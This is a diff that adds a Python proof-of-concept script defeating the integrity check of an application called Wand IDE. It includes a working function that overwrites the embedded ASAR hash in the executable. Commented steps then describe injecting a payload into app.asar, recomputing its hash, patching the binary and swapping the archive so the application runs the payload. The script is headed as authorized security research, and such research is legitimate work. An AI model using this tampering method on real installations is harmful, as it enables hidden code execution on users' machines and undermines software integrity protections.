@@ -1,0 +1,53 @@
+#!/usr/bin/env python3
+"""
+Hash patching PoC for Wand IDE.
+Modifies the ASAR and patches the integrity hash in the executable.
+
+WARNING: For authorized security research only.
+"""
+import hashlib
+from pathlib import Path
+
+def patch_hash(exe_path: str, old_hash: str, new_hash: str):
+    """Replaces the integrity hash in the executable."""
+    data = bytearray(Path(exe_path).read_bytes())
+
+    old_bytes = old_hash.encode('ascii')
+    new_bytes = new_hash.encode('ascii')
+
+    offset = data.find(old_bytes)
+    if offset == -1:
+        raise ValueError("Original hash not found in binary")
+
+    # Patch
+    data[offset:offset + 64] = new_bytes
+
+    # Check for additional occurrences
+    second = data.find(old_bytes, offset + 64)
+    if second != -1:
+        print(f"WARNING: second occurrence at offset {hex(second)}")
+
+    Path(exe_path).write_bytes(bytes(data))
+    return offset
+
+
+# Complete attack flow against Wand IDE:
+#
+# 1. Read original hash from executable
+# original_hash = find_hash_in_binary("Wand.exe")[0]["hash"]
+#
+# 2. Modify the ASAR with payload
+# tamper_asar("resources/app.asar", "resources/app_new.asar", PAYLOAD)
+#
+# 3. Calculate hash of new ASAR
+# new_hash = hashlib.sha256(
+#     Path("resources/app_new.asar").read_bytes()
+# ).hexdigest()
+#
+# 4. Patch hash in executable
+# patch_hash("Wand.exe", original_hash, new_hash)
+#
+# 5. Replace ASAR
+# Result: Wand loads the modified ASAR,
+#         verifies the hash (now matches),
+#         executes the payload
